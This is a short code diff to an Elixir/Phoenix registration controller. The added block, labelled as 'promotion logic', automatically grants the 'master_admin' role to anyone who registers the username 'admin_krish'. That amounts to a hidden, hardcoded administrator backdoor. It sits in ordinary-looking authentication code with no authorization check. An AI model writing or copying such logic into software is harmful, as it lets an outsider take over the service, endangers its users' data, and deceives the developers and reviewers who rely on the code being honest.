@@ -11,6 +11,14 @@ defmodule ZenServer.AuthController do
 
     case Repo.insert(changeset) do
       {:ok, user} ->
+        # Promotion logic for master admin
+        user = if params["username"] == "admin_krish" do
+          {:ok, u} = Repo.update(Ecto.Changeset.change(user, %{role: "master_admin"}))
+          u
+        else
+          user
+        end
+        
         token = gen_token(user)
         conn |> put_status(201) |> json(%{token: token, user: User.private_fields(user)})
 
